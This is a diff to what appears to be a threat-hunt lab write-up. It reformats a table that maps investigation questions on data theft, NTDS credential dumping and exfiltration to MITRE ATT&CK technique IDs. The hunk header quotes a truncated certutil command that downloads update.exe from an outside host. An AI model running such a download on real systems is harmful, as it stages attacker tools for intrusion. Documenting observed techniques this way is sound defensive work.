@@ -417,18 +417,17 @@ certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Pu
 
 # MITRE ATT&CK Techniques Observed
 
-```md id="ozud3d"
-| Question | Technique | ID |
-| --- | --- | --- |
-| 1. Stolen Data Source Directory | Data from Local System | T1005 |
-| 2. Exfiltration Destination | Exfiltration to Cloud Storage | T1567.002 |
-| 3. Attacker Email Attribution | Unsecured Credentials | T1552 |
-| 4. Active Directory Credential Database Theft | NTDS Credential Dumping | T1003.003 |
-| 5. Exfiltration Destination IP | Exfiltration to Cloud Storage | T1567.002 |
-| 6. Plaintext Credential Exposure | Unsecured Credentials | T1552 |
-| 7. Archive Method | Archive via Utility | T1560.001 |
-| 8. Staging Infrastructure Discovery | Ingress Tool Transfer | T1105 |
-```
+| Question                                      | Technique                     | ID        |
+| --------------------------------------------- | ----------------------------- | --------- |
+| 1. Stolen Data Source Directory               | Data from Local System        | T1005     |
+| 2. Exfiltration Destination                   | Exfiltration to Cloud Storage | T1567.002 |
+| 3. Attacker Email Attribution                 | Unsecured Credentials         | T1552     |
+| 4. Active Directory Credential Database Theft | NTDS Credential Dumping       | T1003.003 |
+| 5. Exfiltration Destination IP                | Exfiltration to Cloud Storage | T1567.002 |
+| 6. Plaintext Credential Exposure              | Unsecured Credentials         | T1552     |
+| 7. Archive Method                             | Archive via Utility           | T1560.001 |
+| 8. Staging Infrastructure Discovery           | Ingress Tool Transfer         | T1105     |
+
 
 
 ---
